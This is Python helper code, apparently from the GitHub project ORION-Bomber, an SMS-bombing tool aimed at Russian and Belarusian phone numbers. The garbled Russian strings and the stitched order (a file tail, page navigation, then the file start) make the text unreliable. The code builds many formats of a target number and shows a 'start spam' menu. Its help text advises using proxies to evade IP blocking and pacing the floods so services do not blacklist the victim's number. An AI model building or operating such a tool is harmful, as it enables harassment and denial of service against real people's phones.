	print(colored("Ð¢Ð°ÐºÐ¶Ðµ Ð½Ð° Ð´Ð°Ð½Ð½Ñ‹Ñ… ÑÐµÑ€Ð²Ð¸ÑÐ°Ñ… Ð¾Ñ‡ÐµÐ½ÑŒ Ð¼Ð°Ð»Ð¾ Ð´Ð¾Ð²Ð¾Ð»ÑŒÐ½Ð¾ Ð±Ñ‹ÑÑ‚Ñ€Ñ‹Ñ… Ð¸ Ð°Ð½Ð¾Ð½Ð¸Ð¼Ð½Ñ‹Ñ… Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ‡Ñ‚Ð¾ Ð¿Ð¾Ð·Ð²Ð¾Ð»ÑÐ»Ð¾ Ð±Ñ‹ ÑƒÐ»ÑƒÑ‡ÑˆÐ¸Ñ‚ÑŒ ÑÐ¿Ð°Ð¼ Ñ Ð½Ð¸Ð¼Ð¸.", "green"))
	print(colored("Ð§Ð°ÑÑ‚Ð°Ñ Ð¿Ñ€Ð¾Ð²ÐµÑ€ÐºÐ° Ð²Ð¾Ð·Ð½Ð¸ÐºÐ°ÐµÑ‚ Ð¸Ð·-Ð·Ð° Ð½Ðµ ÑÑ‚Ð°Ð±Ð¸Ð»ÑŒÐ½Ð¾ÑÑ‚Ð¸ ÑÑ‚Ð¸Ñ… Ð¿Ñ€Ð¾ÐºÑÐ¸, Ñ‡Ð°ÑÑ‚Ð¾ Ð¾Ð½Ð¸ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð¿ÐµÑ€ÐµÑÑ‚Ð°ÑŽÑ‚ Ñ€Ð°Ð±Ð¾Ñ‚Ð°Ñ‚ÑŒ Ð¸ Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼Ð¼Ð° Ð±ÐµÑ€ÐµÑ‚ ÑÐ»ÐµÐ´ÑƒÑŽÑ‰Ð¸Ð¹ Ð¸Ð· ÑÐ¿Ð¸ÑÐºÐ°.", "green"))
	print("")
	print(colored("ÐŸÐ¾Ñ‡ÐµÐ¼Ñƒ Ð½ÐµÐ»ÑŒÐ·Ñ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð±Ñ€Ð°Ñ‚ÑŒ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ð»ÑŽÐ±Ð¾Ð¹ ÑÑ‚Ñ€Ð°Ð½Ñ‹ Ð° Ð½Ðµ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð½Ð¾Ð¼ÐµÑ€Ð° ÐºÐ¾Ñ‚Ð¾Ñ€Ð¾Ð³Ð¾ Ð²Ð²ÐµÐ»Ð¸?", "cyan"))
	print(colored("ÐÐµ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒÑÑ Ð¸ÑÐ¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÑŒ Ð´Ð¾Ð¿ÑƒÑÑ‚Ð¸Ð¼ ÐºÐ°Ð½Ð°Ð´ÑÐºÐ¸Ðµ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ Ñ€Ð¾ÑÑÐ¸Ð¹ÑÐºÐ¸Ð¼Ð¸ ÑÐµÑ€Ð²Ð¸ÑÐ°Ð¼Ð¸ Ñ Ð´Ð¾Ð¼ÐµÐ½Ð¾Ð¼ .ru", "green"))
	print(colored("Ð•ÑÐ»Ð¸ Ð½Ð° ÑÐ°Ð¹Ñ‚Ðµ ÑƒÐºÐ°Ð·Ð°Ð½ Ð´Ð¾Ð¼ÐµÐ½ Ð´Ð°Ð½Ð½Ð¾Ð¹ ÑÑ‚Ñ€Ð°Ð½Ñ‹ Ñ‚Ð¾ Ð¸ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ð´Ð¾Ð»Ð¶Ð½Ñ‹ Ð±Ñ‹Ñ‚ÑŒ ÑÑ‚Ð¾Ð¹ Ð¶Ðµ ÑÑ‚Ñ€Ð°Ð½Ñ‹.", "green"))
	print(colored("Ð¡ÐµÑ€Ð²Ð¸ÑÑ‹ Ñ Ð´Ð¾Ð¼ÐµÐ½Ð¾Ð¼ ÑÐ²Ð¾ÐµÐ¹ ÑÑ‚Ñ€Ð°Ð½Ñ‹ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð½Ðµ Ð¿ÑƒÑÑ‚ÑÑ‚ Ð½Ð°Ñˆ Ð·Ð°Ð¿Ñ€Ð¾Ñ Ñ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ð¸Ð½Ð¾Ð¹ ÑÑ‚Ñ€Ð°Ð½Ñ‹.", "green"))
	print("")
	print(colored("ÐŸÐ¾Ñ‡ÐµÐ¼Ñƒ Ð½ÐµÐ»ÑŒÐ·Ñ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð¿Ð¾Ð´ÐºÐ»ÑŽÑ‡Ð¸Ñ‚ÑŒ Ð±Ð¾Ð»ÑŒÑˆÐµ ÑÐµÑ€Ð²Ð¸ÑÐ¾Ð² Ð´Ð»Ñ Ð¿Ñ€Ð¾ÐºÑÐ¸?", "cyan"))
	print(colored("90% Ð¡ÐµÑ€Ð²Ð¸ÑÐ¾Ð² Ñ Ð±ÐµÑÐ¿Ð»Ð°Ñ‚Ð½Ñ‹Ð¼Ð¸ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð²Ð¾Ñ€ÑƒÑŽÑ‚ Ð¸Ñ… Ð´Ñ€ÑƒÐ³ Ñƒ Ð´Ñ€ÑƒÐ³Ð° Ð¸ Ð¸Ð·-Ð·Ð° ÑÑ‚Ð¾Ð³Ð¾ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð½Ðµ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒÑÑ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ð±Ð¾Ð»ÑŒÑˆÐ¸Ð¹ ÑÐ¿Ð¸ÑÐ¾Ðº.", "green"))
	print(colored("ÐœÑ‹ ÑÑ‚Ð°Ñ€Ð°ÐµÐ¼ÑÑ Ð¸ÑÐºÐ°Ñ‚ÑŒ Ñ…Ð¾Ñ€Ð¾ÑˆÐ¸Ðµ ÑÐµÑ€Ð²Ð¸ÑÑ‹ Ñ Ð±ÐµÑÐ¿Ð»Ð°Ñ‚Ð½Ñ‹Ð¼Ð¸ Ð¿Ñ€Ð¾ÐºÑÐ¸ ÐºÐ¾Ñ‚Ð¾Ñ€Ñ‹Ðµ Ð½Ðµ Ð²Ð¾Ñ€ÑƒÑŽÑ‚ Ð´Ñ€ÑƒÐ³ Ñƒ Ð´Ñ€ÑƒÐ³Ñƒ Ð¸ ÑƒÐ´Ð¾Ð±Ð½Ñ‹ Ð² Ð¿Ð°Ñ€ÑÐ¸Ð½Ð³Ðµ Ð»Ð¸Ð±Ð¾ Ð¸Ð¼ÐµÑŽÑ‚ ÑÐ²Ð¾Ð¹ API.", "green"))
	print("")
	print("")
	print(colored("Ð¡Ð¾Ð²ÐµÑ‚ÑƒÐµÐ¼ Ð²Ð°Ð¼ Ð¸ÑÐ¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÑŒ Ð²Ð°ÑˆÐ¸ ÑÐ¾Ð±ÑÑ‚Ð²ÐµÐ½Ð½Ñ‹Ðµ Ð¿Ð¾ÐºÑƒÐ¿Ð½Ñ‹Ðµ Ð¿Ñ€Ð¾ÐºÑÐ¸ ÐµÑÐ»Ð¸ Ñ…Ð¾Ñ‚Ð¸Ñ‚Ðµ ÑÐ¾ÐºÑ€Ð°Ñ‚Ð¸Ñ‚ÑŒ Ð±Ð»Ð¾ÐºÐ¸Ñ€Ð¾Ð²ÐºÑƒ Ð²Ð°ÑˆÐµÐ³Ð¾ IP Ñƒ ÑÐµÑ€Ð²Ð¸ÑÐ¾Ð² Ð¸ Ð¸Ð¼ÐµÑ‚ÑŒ Ñ…Ð¾Ñ€Ð¾ÑˆÑƒÑŽ ÑÐºÐ¾Ñ€Ð¾ÑÑ‚ÑŒ ÑÐ¿Ð°Ð¼Ð°", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def inst_logs():
	# Checking File System Access
	try:
		if platform == "linux" or platform == "linux2":
			shutil.copyfile('tools/logs.txt', '/storage/emulated/0/Download/logs.txt')
			shutil.copyfile('tools/error_logs.txt', '/storage/emulated/0/Download/error_logs.txt')
			print(colored("Ð¤Ð°Ð¹Ð»Ñ‹", "green"), colored("logs.txt error_logs.txt", "cyan"), colored("Ð±Ñ‹Ð»Ð¸ ÑÐ¾Ñ…Ñ€Ð°Ð½ÐµÐ½Ñ‹ Ð² Ð¿Ð°Ð¿ÐºÑƒ Download Ð½Ð° Ð²Ð°ÑˆÐµÐ¼ ÑƒÑÑ‚Ñ€Ð¾Ð¹ÑÑ‚Ð²Ðµ", "green"))
			print(colored("ÐŸÐ¾Ð¶Ð°Ð»ÑƒÐ¹ÑÑ‚Ð° Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÑŒÑ‚Ðµ Ð¿Ð¾Ð¾Ñ‡ÐµÑ€ÐµÐ´Ð½Ð¾ ÑÑ‚Ð¸ 2 Ñ„Ð°Ð¹Ð»Ð° Ð½Ð°ÑˆÐµÐ¼Ñƒ Ð±Ð¾Ñ‚Ñƒ Ð² Ñ‚ÐµÐ»ÐµÐ³Ñ€Ð°Ð¼", "green"), colored("https://t.me/orion_feedback_bot", "cyan"))
			print("")
			print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
			input()
		elif platform == "win32":
			print("")
			print(colored("ÐŸÐ¾Ð¶Ð°Ð»ÑƒÐ¹ÑÑ‚Ð° Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÑŒÑ‚Ðµ Ð½Ð°ÑˆÐµÐ¼Ñƒ Ð±Ð¾Ñ‚Ñƒ Ð² Ñ‚ÐµÐ»ÐµÐ³Ñ€Ð°Ð¼", "green"), colored("https://t.me/orion_feedback_bot", "cyan"), colored("Ð¿Ð¾Ð¾Ñ‡ÐµÑ€ÐµÐ´Ð½Ð¾ Ñ„Ð°Ð¹Ð»Ñ‹", "green"), colored("logs.txt error_logs.txt", "cyan"), colored("Ð¸Ð· Ð¿Ð°Ð¿ÐºÐ¸", "green"), colored("tools", "cyan"))
			print("")
			print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
			input()
	except:
		print("")
		print(colored("ÐœÑ‹ Ð½Ðµ ÑÐ¼Ð¾Ð³Ð»Ð¸ Ð¿ÐµÑ€ÐµÐ¼ÐµÑÑ‚Ð¸Ñ‚ÑŒ Ñ„Ð°Ð¹Ð»Ñ‹ Ð² Ð½ÑƒÐ¶Ð½ÑƒÑŽ Ð´Ð¸Ñ€ÐµÐºÑ‚Ð¾Ñ€Ð¸ÑŽ", "yellow"))
		print(colored("Ð’Ð¾Ð·Ð¼Ð¾Ð¶Ð½Ð¾ Ñƒ Ð²Ð°Ñ Ð´Ð»Ñ Ð¢ÐµÑ€Ð¼ÑƒÐºÑÐ° Ð² Ð½Ð°ÑÑ‚Ñ€Ð¾Ð¹ÐºÐ°Ñ… Ñ€Ð°Ð·Ñ€ÐµÑˆÐµÐ½Ð¸Ñ Ð¿Ñ€Ð¸Ð»Ð¾Ð¶ÐµÐ½Ð¸ÑŽ Ð½Ðµ Ð´Ð¾ÑÑ‚ÑƒÐ¿Ð½Ñ‹ Ð¤Ð°Ð¹Ð»Ñ‹ Ð¸ Ð¼ÐµÐ´Ð¸Ð°ÐºÐ¾Ð½Ñ‚ÐµÐ½Ñ‚", "yellow"))
		print(colored("ÐŸÐ¾Ð¶Ð°Ð»ÑƒÐ¹ÑÑ‚Ð° Ñ€Ð°Ð·Ñ€ÐµÑˆÐ¸Ñ‚Ðµ Ð¢ÐµÑ€Ð¼ÑƒÐºÑÑƒ Ð² Ð½Ð°ÑÑ‚Ñ€Ð¾Ð¹ÐºÐ°Ñ… Ð²ÑÐµ Ð½ÑƒÐ¶Ð½Ñ‹Ðµ Ñ€Ð°Ð·Ñ€ÐµÑˆÐµÐ½Ð¸Ñ Ð¸ Ð¿Ð¾Ð²Ñ‚Ð¾Ñ€Ð¸Ñ‚Ðµ Ð¿Ð¾Ð¿Ñ‹Ñ‚ÐºÑƒ"))
		print(colored("Ð—Ð° Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ Ð¿Ð¾ Ð´Ð°Ð½Ð½Ð¾Ð¼Ñƒ Ð²Ð¾Ð¿Ñ€Ð¾ÑÑƒ Ð¿Ð¸ÑˆÐ¸Ñ‚Ðµ Ð² Ð½Ð°ÑˆÐµÐ³Ð¾ Ð±Ð¾Ñ‚Ð° Ð² Ñ‚ÐµÐ»ÐµÐ³Ñ€Ð°Ð¼"), colored("https://t.me/orion_feedback_bot", "cyan"))
		print("")
		print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
		input()

def clear_logs():
	a = open("tools/logs.txt", "w")
	a.close()
	a = open("tools/error_logs.txt", "w")
	a.close()
	print("")
	print(colored("Ð›Ð¾Ð³Ð¸ ÑƒÑÐ¿ÐµÑˆÐ½Ð¾ Ð±Ñ‹Ð»Ð¸ Ð¾Ñ‡Ð¸Ñ‰ÐµÐ½Ñ‹", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def banner_info():
	print(colored("\nÐ¢ÐµÐ»ÐµÐ³Ñ€Ð°Ð¼", "cyan"))
	print("â”œ"+colored("Lucky", "green")+":", colored("https://t.me/Lucky1376", "cyan"))
	print("â”œ"+colored("LostIk", "red")+":", colored("https://t.me/LostIk31", "cyan"))
	print("â””"+colored("ÐšÐ°Ð½Ð°Ð»", "cyan")+":", colored("https://t.me/orion_bomber", "cyan"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def number_ckeck(numb):
	if len(numb) == 9 or len(numb) == 10:
		sp_numb = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
		for i in str(numb):
			try:
				int(i)
			except:
				return False
		return True
	else:
		return False

Sign up
Lucky1376
/
ORION-Bomber
Public
Code
Issues
1
Pull requests
1
Actions
Projects
Security
Insights
ORION-Bomber/tools/tools.py
@Lucky1376
Lucky1376 ðŸŽ„Happy New Year! 1.3.0
â€¦
 4 contributors
978 lines (903 sloc)  41.6 KB
# -*- coding: utf-8 -*-

# Tools for different processing

from termcolor import colored
from datetime import datetime
import requests as r, os, time, random, shutil, zipfile, webbrowser
from sys import platform
from tools import proxy
from progress.bar import ChargingBar
from tools import sender as send

def FormattingNumber(number, country):
	numb = str(number)
	if country == "ru": # For Russia
		if numb[0:1] == "+" and numb[1:2] == "7": # +71234567890
			numb_1 = numb
			numb_2 = numb[1:]
			numb_3 = "8"+numb[2:]
			numb_4 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
			numb_5 = numb[:2] + " " + numb[2:5] + " " + numb[5:8] + " " + numb[8:10] + " " + numb[10:]
			numb_6 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " - " + numb[8:10] + " - " + numb[10:]
			numb_7 = numb[:2] + " ("+numb[2:]
			numb_8 = numb[2:]
			numb_9 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " " + numb[8:10] + numb[10:]
			numb_10 = numb[:2] + ' ' + numb[2:5] + ' ' + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
		elif numb[0:1] == "7":  # 71234567890
			numb_1 = "+"+numb
			numb_2 = numb
			numb_3 = "8"+numb[1:]
			numb = "+"+numb
			numb_4 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
			numb_5 = numb[:2] + " " + numb[2:5] + " " + numb[5:8] + " " + numb[8:10] + " " + numb[10:]
			numb_6 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " - " + numb[8:10] + " - " + numb[10:]
			numb_7 = numb[:2] + " ("+numb[2:]
			numb_8 = numb[2:]
			numb_9 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " " + numb[8:10] + numb[10:]
			numb_10 = numb[:2] + ' ' + numb[2:5] + ' ' + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
		elif numb[0:1] == "8":  # 81234567890
			numb_1 = "+7"+numb[1:]
			numb_2 = "7"+numb[1:]
			numb_3 = numb
			numb = "+7"+numb[1:]
			numb_4 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
			numb_5 = numb[:2] + " " + numb[2:5] + " " + numb[5:8] + " " + numb[8:10] + " " + numb[10:]
			numb_6 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " - " + numb[8:10] + " - " + numb[10:]
			numb_7 = numb[:2] + " ("+numb[2:]
			numb_8 = numb[2:]
			numb_9 = numb[:2] + " (" + numb[2:5] + ") " + numb[5:8] + " " + numb[8:10] + numb[10:]
			numb_10 = numb[:2] + ' ' + numb[2:5] + ' ' + numb[5:8] + "-" + numb[8:10] + "-" + numb[10:]
	elif country == "by": # For Belarus
		if numb[0:1] == "+": # +123456789012
			numb_1 = numb
			numb_2 = numb[1:]
			numb_3 = numb[4:]
			numb_4 = numb[:4] + ' (' + numb[4:6] + ") " + numb[6:9] + '-' + numb[9:11] + '-' + numb[11:13]
			numb_5 = numb[:4] + ' (' + numb[4:6] + ") " + numb[6:9] +numb[9:11] +numb[11:13]
		elif numb[0:1] == "3" or numb[0:3] == "375": # 123456789012
			numb_1 = "+"+numb
			numb_2 = numb
			numb_3 = numb[3:]
			numb_4 = '+' + numb[:3] + ' (' + numb[3:5] + ") " + numb[5:8] + '-' + numb[8:10] + '-' + numb[10:12]
			numb_5 = numb_1[:4] + ' (' + numb_1[4:6] + ") " + numb_1[6:9] +numb_1[9:11] +numb_1[11:13]
	if country == "by":
		return numb_1, numb_2, numb_3, numb_4, numb_5
	elif country == "ru":
		return numb_1, numb_2, numb_3, numb_4, numb_5, numb_6, numb_7, numb_8, numb_9, numb_10

def clear():
	if platform == "linux" or platform == "linux2" or platform == "darwin":
		os.system("clear")
	elif platform == "win32":
		os.system("cls")
	else:
		print(colored("\nÐ˜Ð·Ð²Ð¸Ð½Ð¸Ñ‚Ðµ Ð½Ð°ÑˆÐ° Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼Ð¼Ð° Ð½Ðµ Ð¿Ð¾Ð´Ð´ÐµÑ€Ð¶Ð¸Ð²Ð°ÐµÑ‚ Ð²Ð°ÑˆÑƒ Ð¾Ð¿ÐµÑ€Ð°Ñ†Ð¸Ð¾Ð½Ð½ÑƒÑŽ ÑÐ¸ÑÑ‚ÐµÐ¼Ñƒ ;(\n", "red"))
		exit()

def anim_text(text, speed, color="green"):
	for i in text:
		print(colored(i, color), end="", flush=True)
		time.sleep(speed)

def RCT(text):
	colors = ["green", "yellow", "red", "magenta", "blue"]
	new_text = ""
	for i in str(text):
		new_text += colored(i, random.choice(colors))
	return new_text

def banner():
	a = open("tools/version.txt", "r")
	ver = a.read().split("\n")[0]
	a.close()

	ru_s = str(len(send.services_list))
	by_s = str(len(send.services_list_by))

	banner = colored("""
	   â†   â†       â†        â†     â†   â†   â†
	â†		    â†        â†       â†     â†
	 â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–€â–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–„  â† â–ˆ 
	â–’â–ˆâ–ˆâ–’  â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ â–’ â–ˆâ–ˆâ–’â–“â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–’  â–ˆâ–ˆâ–’ â–ˆâ–ˆ â–€â–ˆ   â–ˆ 
	â–’â–ˆâ–ˆâ–‘â† â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ â–‘â–„â–ˆ â–’â–’â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–‘â† â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ  â–€â–ˆ â–ˆâ–ˆâ–’
	â–’â–ˆâ–ˆ   â–ˆâ–ˆâ–‘â–’â–ˆâ–ˆâ–€â–€â–ˆâ–„  â–‘â–ˆâ–ˆâ–‘â–’â–ˆâ–ˆ   â–ˆâ–ˆâ–‘â–“â–ˆâ–ˆâ–’  â–â–Œâ–ˆâ–ˆâ–’
	â–‘ â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘â–‘â–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–’â–‘â–ˆâ–ˆâ–‘â–‘ â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘â–’â–ˆâ–ˆâ–‘   â–“â–ˆâ–ˆâ–‘
	â–‘ â–’â–‘â–’â–‘â–’â–‘ â–‘ â–’â–“ â–‘â–’â–“â–‘â–‘â–“  â–‘ â–’â–‘â–’â–‘â–’â–‘ â–‘ â–’â–‘ â† â–’ â–’ 
	  â–‘ â–’ â–’â–‘   â–‘â–’ â–‘ â–’â–‘ â–’ â–‘  â–‘ â–’ â–’â–‘ â–‘ â–‘â–‘   â–‘ â–’â–‘
	â–‘ â–‘ â–‘ â–’ â†  â–‘â–‘   â–‘  â–’ â–‘â–‘ â–‘ â–‘ â–’     â–‘   â–‘ â–‘ 
	    â–‘ â–‘     â–‘  â†   â–‘     â†â–‘ â–‘  â†    â†   â–‘ 
	 â†  	â†          â†        â†""", "blue")

	new_year = " "*21+RCT("Happy New Year!")
	pred_info = "\n"+" "*24+colored("Ð¡ÐµÑ€Ð²Ð¸ÑÑ‹", "green")+"\n"
	pred_info_ru = " "*17+colored("Ð Ð¾ÑÑÐ¸Ñ ", "blue")+colored(ru_s, "green")+"   "
	pred_info_by = colored("Ð‘ÐµÐ»Ð°Ñ€ÑƒÑÑŒ ", "cyan")+colored(by_s, "green")+"\n"
	pred_info = pred_info+pred_info_ru+pred_info_by

	info = " "*13+colored("[", "blue")+"Developers :"+colored("Lucky", "green")+" and "+colored("LostIk", "red")
	info_2 = " "*13+colored("[", "blue")+"Version    :"+colored(ver, "red")+"ðŸŽ„"
	info_3 = " "*13+colored("[", "blue")+"Telegram   :"+colored("@orion_bomber", "cyan")+colored("   <--", "green")+"\n"

	print(banner)
	print(new_year)
	print(pred_info)
	print(info)
	print(info_2)
	print(info_3)

def banner_tools():
	print(colored("[1]", "red"), colored("ÐÐ°Ñ‡Ð°Ñ‚ÑŒ ÑÐ¿Ð°Ð¼", "green"))
	#print(colored("[2]", "red"), colored("FAQ ÐŸÑ€Ð¾ Ð¿Ñ€Ð¾ÐºÑÐ¸", "blue"))
	#print(colored("[3]", "red"), colored("ÐšÑ€Ð°Ñ‚ÐºÐ¾Ðµ Ñ€ÑƒÐºÐ¾Ð²Ð¾Ð´ÑÑ‚Ð²Ð¾ Ð¿Ñ€Ð¾Ð±Ð»ÐµÐ¼", "cyan"))
	#print(colored("[4]", "red"), colored("ÐžÑ‚ÐºÐ°Ð· Ð¾Ñ‚ Ð¾Ñ‚Ð²ÐµÑ‚ÑÑ‚Ð²ÐµÐ½Ð½Ð¾ÑÑ‚Ð¸", "red"))
	print(colored("[2]", "red"), colored("ÐŸÐ¾Ð´Ð´ÐµÑ€Ð¶Ð°Ñ‚ÑŒ Ñ€Ð°Ð·Ñ€Ð°Ð±Ð¾Ñ‚Ñ‡Ð¸ÐºÐ¾Ð²!    <---", "green"))
	print(colored("[3]", "red"), colored("Ð˜Ð½ÑÑ‚Ñ€ÑƒÐºÑ†Ð¸Ñ Ð¿Ð¾ Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÐµ Ð»Ð¾Ð³Ð¾Ð²", "yellow"))
	print(colored("\n[99]", "red"), colored("Ð˜Ð½Ñ„Ð¾Ñ€Ð¼Ð°Ñ†Ð¸Ñ", "cyan"))
	print(colored("\n[0] Ð’Ñ‹Ñ…Ð¾Ð´", "red"))

def quick_guide():
	print("")
	print(colored("Ð’ Ð½Ð°ÑˆÐµÐ¼ Ð±Ð¾Ð¼Ð±ÐµÑ€Ðµ ÑÐ¿Ð°Ð¼ Ð¼Ð¾Ð¶ÐµÑ‚ Ð¿Ð¾ÑÑ‚ÐµÐ¿ÐµÐ½Ð½Ð¾ ÑƒÑ…ÑƒÐ´ÑˆÐ°Ñ‚ÑŒÑÑ Ð¸Ð·-Ð·Ð° Ñ‚Ð¾Ð³Ð¾ Ñ‡Ñ‚Ð¾ Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð¸ Ñ‚Ð¾Ñ‚ Ð¶Ðµ Ð½Ð¾Ð¼ÐµÑ€ Ð¿Ð¾ÑÑ‚ÑƒÐ¿Ð°ÐµÑ‚ Ð¾Ñ‡ÐµÐ½ÑŒ Ð¼Ð½Ð¾Ð³Ð¾ Ð·Ð°Ð¿Ñ€Ð¾ÑÐ¾Ð² Ð½Ð° Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÑƒ ÑÐ¼Ñ.", "green"))
	print(colored("ÐÐµ Ð¿Ñ‹Ñ‚Ð°Ð¹Ñ‚ÐµÑÑŒ Ð¾ÑÑ‚Ð°Ð²Ð¸Ñ‚ÑŒ ÑÐ¿Ð°Ð¼ Ð½Ð° Ð²ÑÑŽ Ð½Ð¾Ñ‡ÑŒ Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð¸ Ñ‚Ð¾Ñ‚ Ð¶Ðµ Ð½Ð¾Ð¼ÐµÑ€, Ð²Ñ‹ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð·Ð°ÑÑ‚Ð°Ð²Ð¸Ñ‚Ðµ ÑÐµÑ€Ð²Ð¸ÑÑ‹ Ð·Ð°Ð±Ð»Ð¾ÐºÐ¸Ñ€Ð¾Ð²Ð°Ñ‚ÑŒ Ð´Ð°Ð½Ð½Ñ‹Ð¹ Ð½Ð¾Ð¼ÐµÑ€ Ñƒ ÑÐµÐ±Ñ Ð² Ð±Ð°Ð·Ðµ Ð¸ Ð½Ð¸ÐºÐ°ÐºÐ¸Ðµ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ‚ÑƒÑ‚ ÑƒÐ¶Ðµ Ð½Ðµ Ð¿Ð¾Ð¼Ð¾Ð³ÑƒÑ‚.", "green"))
	print(colored("Ð”Ð¾ÑÑ‚Ð°Ñ‚Ð¾Ñ‡Ð½Ð¾ 2-3 ÐºÑ€ÑƒÐ³Ð° Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð½Ð¾Ð¼ÐµÑ€ Ñ€Ð°Ð· Ð² ÑÑƒÑ‚ÐºÐ¸ Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð´Ð¾ÑÑ‚Ð°Ð²Ð¸Ñ‚ÑŒ Ð½Ðµ Ð¼Ð°Ð»Ð¾Ðµ ÐºÐ¾Ð»Ð¸Ñ‡ÐµÑÑ‚Ð²Ð¾ ÑÐ¼Ñ Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð½Ð¾Ð¼ÐµÑ€.", "green"))
	print(colored("ÐÐµ Ð±ÑƒÐ´ÑŒÑ‚Ðµ Ð¶Ð°Ð´Ð½Ñ‹ Ð¸ ÑÐ»Ð¸ÑˆÐºÐ¾Ð¼ Ð¼ÑÑ‚Ð¸Ñ‚ÐµÐ»ÑŒÐ½Ñ‹, Ñ‚Ð¾Ð³Ð´Ð° Ð²Ñ‹ ÑÐ¼Ð¾Ð¶ÐµÑ‚Ðµ Ð¾Ñ‚Ð¿Ñ€Ð°Ð²Ð»ÑÑ‚ÑŒ ÑÐ¼Ñ Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð¸ Ñ‚Ð¾Ñ‚ Ð¶Ðµ Ð½Ð¾Ð¼ÐµÑ€ Ð¿Ð¾ÑÑ‚Ð¾ÑÐ½Ð½Ð¾.", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def disclaimer():
	print("")
